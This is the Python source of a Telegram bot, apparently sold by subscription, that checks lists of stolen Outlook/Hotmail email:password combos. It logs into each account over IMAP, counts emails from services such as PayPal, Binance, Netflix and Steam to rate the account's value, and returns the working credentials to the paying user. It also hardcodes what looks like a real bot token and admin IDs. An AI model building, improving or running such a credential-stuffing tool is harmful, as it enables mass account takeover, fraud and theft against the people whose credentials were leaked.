import os
import telebot
import imaplib
import json
import email
import random
import string
from email.header import decode_header
from datetime import datetime, timedelta
import time

stop_flag = False
from threading import Thread
import logging

# Set up logging
logging.basicConfig(filename='bot.log', level=logging.INFO,
                    format='%(asctime)s %(levelname)s:%(message)s')

# Hide API Token and Admin IDs by fetching them from environment variables
API_TOKEN = os.getenv('7525726247:AAFkBwH45ifa0kWRd7_A3G4VV94kXKDnFTI', '7525726247:AAFkBwH45ifa0kWRd7_A3G4VV94kXKDnFTI')  # Correctly fetch the API token
Admin = os.getenv('ADMINS', '6652287427,6431874600').split(',')
BOT_USERNAME = '@kilteshotmailbot'

bot = telebot.TeleBot(API_TOKEN)

# Load subscribers from file
def load_subscribers():
    try:
        with open('hotmail.json', 'r') as file:
            data = json.load(file)
            return {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}
    except Exception as e:
        logging.error(f"Error loading subscribers: {e}")
        return {}

subscribers = load_subscribers()
redeem_codes = {}

def save_subscribers(subscribers_dict):
    try:
        with open('hotmail.json', 'w') as file:
            subscribers_list = [{'id': k, 'expiry_date': v} for k, v in subscribers_dict.items()]
            json.dump({'subscribers': subscribers_list}, file, indent=4)
    except Exception as e:
        logging.error(f"Error saving subscribers: {e}")

@bot.message_handler(commands=["start"])
def start(message):
    chat_id = str(message.chat.id)
    if chat_id not in subscribers:
        bot.reply_to(message, "Hey! This bot is not free. Ask @kiltes to get access.")
        return

    expiry_date_str = subscribers[chat_id]
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()

    if current_date > expiry_date:
        bot.reply_to(message, "Sorry, your premium subscription has expired.")
    else:
        bot.reply_to(message, "Drop a combo here and let me do magic â€ž. Do /cmds to view available commands")

# Command to generate redeem codes (Admin only)
@bot.message_handler(commands=['code'])
def generate_code(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide the number of days for the code validity.")
        return

    days = int(args[1])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')

    # Generate a random code
    random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    code = f"kiltes-hotmail-{random_string}"
    redeem_codes[code] = expiry_date

    admin_username = message.from_user.username

    bot.reply_to(message, f"""
Code generated: {code}
Validity: {days} days
Bot: {BOT_USERNAME}
Generated by: @{admin_username}

Usage:
/redeem {code}
""")

# Command to redeem codes
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a redeem code.")
        return

    code = args[1]
    chat_id = str(message.chat.id)

    if code in redeem_codes:
        subscribers[chat_id] = redeem_codes[code]
        save_subscribers(subscribers)
        del redeem_codes[code]
        bot.reply_to(message, f"Redeem code applied successfully! You now have access until {subscribers[chat_id]}.")
    else:
        bot.reply_to(message, "Invalid redeem code.")

# Command to show all available commands
@bot.message_handler(commands=['cmds'])
def list_commands(message):
    commands = """
Available Commands:

1. Check Inbox with Subjects - Upload a text file and reply with /inboxsub. (dead)

2. Capture Options - Use /capture to see the list of available sites for capture.

3. Stop Process - Use /stop to stop the current process.

4. Process Stats - Use /stats to see the current process statistics.

5. Send a Combo to Check Hotmail:
   /start - Start the bot.
   /chk <email:password> - Check inbox.
   /stop - Stop the progress.
   /subscribers - List all subscribers (Admin only).
   /kick <id> - Remove a subscriber (Admin only).
   /allow <id> <days> - Allow a new subscriber (Admin only).
   /code <days> - Generate a redeem code (Admin only).
   /redeem <code> - Redeem a code for bot access.
   /adm <id> - Add a new admin (Admin only).
   /dms <id> - Remove an admin (Admin only).
"""
    bot.reply_to(message, commands)

# Command to add a new admin (Admin only)
@bot.message_handler(commands=['adm'])
def add_admin(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a user ID to add as admin.")
        return

    new_admin_id = args[1]
    Admin.append(new_admin_id)
    bot.reply_to(message, f"User {new_admin_id} has been added as an admin.")

# Command to remove an admin (Admin only)
@bot.message_handler(commands=['dms'])
def delete_admin(message):
    if str(message.chat.id) not in Admin:
        bot.reply_to(message, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Please provide a user ID to remove as admin.")
        return

    admin_id_to_remove = args[1]
    if admin_id_to_remove in Admin:
        Admin.remove(admin_id_to_remove)
        bot.reply_to(message, f"User {admin_id_to_remove} has been removed as an admin.")
    else:
        bot.reply_to(message, "Admin ID not found.")

# Existing command handlers

def check_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email, password)
        mail.logout()
        return True
    except imaplib.IMAP4.error:
        logging.warning(f"Failed login attempt for {email}")
        return False
def check_inbox_count(email_address, password):
    try:
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(email_address, password)
        mail.select("inbox")

        senders = {
            "Instagram": "no-reply@mail.instagram.com",
            "Netflix": "info@mailer.netflix.com",
            "Spotify": "no-reply@spotify.com",
            "PayPal": "service@paypal.com",
            "Amazon": "no-reply@amazon.com",
            "Steam": "noreply@steampowered.com",
            "Facebook": "security@facebookmail.com",
            "Roblox": "info@roblox.com",
            "Snapchat": "no-reply@snapchat.com",
            "Discord": "noreply@discord.com",
            "Supercell": "noreply@id.supercell.com",
            "Tik Tok": "noreply@tiktok.com",
            "YouTube": "noreply@youtube.com",
            "X": "no-reply@twitter.com",
            "LinkedIn": "messages-noreply@linkedin.com",
            "Riot Games": "noreply@mail.accounts.riotgames.com",
            "Epic Games": "no-reply@epicgames.com",
            "Rockstar Games": "noreply@rockstargames.com",
            "Netflix Members": "info@mailer.netflix.com",
            "Twitch": "no-reply@twitch.tv",
            "PlayStation": "noreply@playstation.com",
            "Fortnite": "fortnite@epicgames.com",
            "Ubisoft": "account@ubisoft.com",
            "OnlyFans": "noreply@onlyfans.com",
            "Binance": "do_not_reply@mgdirectmail.binance.com",
            "Pornhub": "noreply@pornhub.com",
            "PUBG Mobile": "no-reply@pubgmobile.com",
            "Activision Updates": "noreply@activision.com"
        }
        
        counts = {}
        for service, sender in senders.items():
            status, messages = mail.search(None, f'FROM "{sender}"')
            if status == "OK":
                email_ids = messages[0].split()
                count = len(email_ids)
                if count > 0:  # Only add to results if count is greater than 0
                    counts[service] = count

        mail.logout()
        return counts

    except Exception as e:
        logging.error(f"Error checking inbox for {email_address}: {e}")
        return str(e)

def process_document(chat_id, file_content):
    global stop_flag
    stop_flag = False  # Reset the stop flag at the start of the process
    start_time = time.time()
    total_lines = len(file_content)
    successful_logins = []
    failed_logins = 0

    for i, line in enumerate(file_content):
        if stop_flag:  # Check if stop was requested
            bot.send_message(chat_id, "Process stopped by user.")
            break
        try:
            email, password = line.split(':')
            if check_login(email, password):
                result = check_inbox_count(email, password)
                if isinstance(result, dict):
                    response = "\n".join([f"{service}: {count} emails" for service, count in result.items()])
                    bot.send_message(chat_id, f"Hotmail Hit\n {email}:{password}\nINBOX\n{response}\nBot by: @newlester")
                else:
                    bot.send_message(chat_id, f"Hotmail Hit\nStatus: Logged In\nCredentials: {email}:{password}\nBot by: @newlester\nError: {result}")
                successful_logins.append(email)
            else:
                failed_logins += 1
        except ValueError:
            failed_logins += 1

        if i % 50 == 0:
            current_time = time.time()
            time_taken = current_time - start_time
            result_message = f"Progress...\nTotal Lines = {total_lines}\nProcessed = {i+1}\nHits = {len(successful_logins)}\nFailed = {failed_logins}\nTime Taken = {time_taken:.2f}s"
            bot.send_message(chat_id, result_message)

    end_time = time.time()
    time_taken = end_time - start_time

    final_result_message = f"Results Captured\nTotal Lines = {total_lines}\nHits = {len(successful_logins)}\nFailed = {failed_logins}\nTime Taken = {time_taken:.2f}s\nBot by: @newlester"
    bot.send_message(chat_id, final_result_message)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if str(message.chat.id) not in subscribers:
        return

    checking_message = bot.reply_to(message, "Pending... Please wait, it may take time. I will inform you when completed.")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8').strip().split('\n')

    if not file_content:  # Check for empty file
        bot.send_message(message.chat.id, "The uploaded file is empty.")
        return

    thread = Thread(target=process_document, args=(message.chat.id, file_content))
    thread.start()

@bot.message_handler(commands=['subscribers'])
def send_subscribers(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    response = "\n".join([f"ID: {subscriber_id} - Expiry Date: {expiry_date}" for subscriber_id, expiry_date in subscribers.items()])
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['kick'])
def kick_subscriber(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, "Please provide a subscriber ID to kick.")
        return

    subscriber_id_to_kick = args[1]
    if subscriber_id_to_kick in subscribers:
        del subscribers[subscriber_id_to_kick]
        save_subscribers(subscribers)
        bot.send_message(message.chat.id, f"Subscriber {subscriber_id_to_kick} has been removed.")
    else:
        bot.send_message(message.chat.id, "Subscriber ID not found.")

@bot.message_handler(commands=['allow'])
def allow_subscriber(message):
    if str(message.chat.id) not in Admin:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) < 3:
        bot.send_message(message.chat.id, "Please provide a subscriber ID and number of days.")
        return

    new_id, days = args[1], int(args[2])
    expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    subscribers[new_id] = expiry_date
    save_subscribers(subscribers)
    bot.send_message(message.chat.id, f"Subscriber {new_id} added with expiry on {expiry_date}.")


@bot.message_handler(commands=['stop'])
def stop_process(message):
    global stop_flag
    stop_flag = True
    bot.reply_to(message, "Stopping the ongoing process...")
@bot.message_handler(commands=['inboxsub'])
def check_inbox_with_subjects(message):
    if message.reply_to_message and message.reply_to_message.document:
        # Get the document from the replied message
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        subjects = downloaded_file.decode('utf-8').splitlines()

        # Check if any subjects were found in the file
        if not subjects:
            bot.reply_to(message, "The uploaded file is empty or could not be read.")
            return

        # Fetch user email credentials for inbox check (assuming user provides them in the format "email:password")
        try:
            email_password = message.text.split()[1]
            email_address, password = email_password.split(':')
        except IndexError:
            bot.reply_to(message, "Usage: /inboxsub <email:password>")
            return
        except ValueError:
            bot.reply_to(message, "Invalid format. Use /inboxsub <email:password>")
            return

        # Check inbox for the provided subjects
        result = check_inbox_for_subjects(email_address, password, subjects)

        # Send the results back to the user
        if isinstance(result, dict):
            response = "\n".join([f"{subject}: {status}" for subject, status in result.items()])
            bot.reply_to(message, f"Inbox subjects check:\n{response}")
        else:
            bot.reply_to(message, f"Error: {result}")

    else:
        bot.reply_to(message, "Please reply to a message containing a .txt file with subjects to check.")
def check_inbox_for_subjects(email_address, password, subjects):
    try:
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(email_address, password)
        mail.select("inbox")

        results = {}
        for subject in subjects:
            status, messages = mail.search(None, f'SUBJECT "{subject}"')
            if status == "OK":
                email_ids = messages[0].split()
                results[subject] = f"Found {len(email_ids)} emails" if email_ids else "No emails found"
            else:
                results[subject] = "Error in searching"

        mail.logout()
        return results

    except Exception as e:
        logging.error(f"Error checking inbox for subjects for {email_address}: {e}")
        return str(e)
        
@bot.message_handler(commands=['txt'])
def convert_text_to_txt(message):
    try:
        # Get the text after the command
        text_to_convert = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None

        if not text_to_convert:
            bot.reply_to(message, "Please provide the text to convert to a .txt file.")
            return

        # Generate a .txt file from the provided text
        file_name = "converted_text.txt"
        with open(file_name, 'w') as file:
            file.write(text_to_convert)

        # Send the generated .txt file to the user
        with open(file_name, 'rb') as file:
            bot.send_document(message.chat.id, file)

    except IndexError:
        bot.reply_to(message, "Please provide the text to convert to a .txt file.")
    except Exception as e:
        logging.error(f"Error in /txt command: {e}")
        bot.reply_to(message, f"An error occurred: {str(e)}")
@bot.message_handler(commands=['split'])
def split_txt_file(message):
    # Check if the message is a reply to a document
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a message containing a .txt file to split.")
        return

    # Check if the user has provided the number of parts
    try:
        parts = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, "Please provide a valid number of parts. Usage: /split <number of parts>")
        return

    # Validate the number of parts
    if parts <= 0:
        bot.reply_to(message, "Please provide a positive number for parts.")
        return

    # Get the file from the replied message
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8').splitlines()

    # Split the content into the specified number of parts
    total_lines = len(file_content)
    lines_per_part = max(1, total_lines // parts)
    split_files = []

    for i in range(parts):
        # Calculate the start and end of each part
        start_index = i * lines_per_part
        end_index = start_index + lines_per_part if i < parts - 1 else total_lines

        # Create the content for this part
        part_content = "\n".join(file_content[start_index:end_index])
        part_file_name = f"part_{i+1}.txt"

        # Write to a new file
        with open(part_file_name, 'w') as part_file:
            part_file.write(part_content)

        # Add the file name to the list of split files
        split_files.append(part_file_name)

    # Send the split files back to the user
    for part_file_name in split_files:
        with open(part_file_name, 'rb') as part_file:
            bot.send_document(message.chat.id, part_file)

    # Clean up generated files after sending them
    for part_file_name in split_files:
        os.remove(part_file_name)
@bot.message_handler(commands=['capture'])
def show_capture_options(message):
    capture_sites = """
Available Sites for Capture:

• Instagram
• Netflix
• Spotify
• PayPal
• Amazon
• Steam
• Facebook
• Roblox
• Snapchat
• Discord
• Supercell
• Tik Tok
• YouTube
• X
• LinkedIn
• Riot Games
• Epic Games
• Rockstar Games
• Netflix Members
• Twitch
• PlayStation
• Fortnite
• Ubisoft
• OnlyFans
• Binance
• Pornhub
• PUBG Mobile
• Activision Updates
    """
    bot.reply_to(message, capture_sites)
@bot.message_handler(commands=['info'])
def send_user_info(message):
    chat_id = str(message.chat.id)
    user_info = bot.get_chat(chat_id)

    # Retrieve User ID and Username
    user_id = user_info.id
    username = user_info.username if user_info.username else "No username"

    # Check Plan Validity
    if chat_id in subscribers:
        expiry_date_str = subscribers[chat_id]
        plan_validity = f"Your plan is valid until {expiry_date_str}."
    else:
        plan_validity = "You do not have an active plan."

    # Get User Profile Picture
    photos = bot.get_user_profile_photos(user_id)

    if photos.total_count > 0:
        # Get the latest profile picture
        file_id = photos.photos[0][-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Send the profile picture with the user's information in the caption
        bot.send_photo(
            chat_id,
            downloaded_file,
            caption=f"Your ID: {user_id}\nYour Username: @{username}\n{plan_validity}"
        )
    else:
        # If user has no profile picture, send the info without photo
        bot.reply_to(
            message,
            f"You don't have a profile picture.\n\nYour ID: {user_id}\nYour Username: @{username}\n{plan_validity}"
        )
        # Global dictionary to track process status
process_status = {}

def update_process_status(chat_id, total_lines, processed, hits, failed, start_time):
    """Updates the status of the ongoing process for a specific chat_id."""
    time_taken = time.time() - start_time
    process_status[chat_id] = {
        'total_lines': total_lines,
        'processed': processed,
        'hits': hits,
        'failed': failed,
        'time_taken': time_taken
    }

bot.infinity_polling()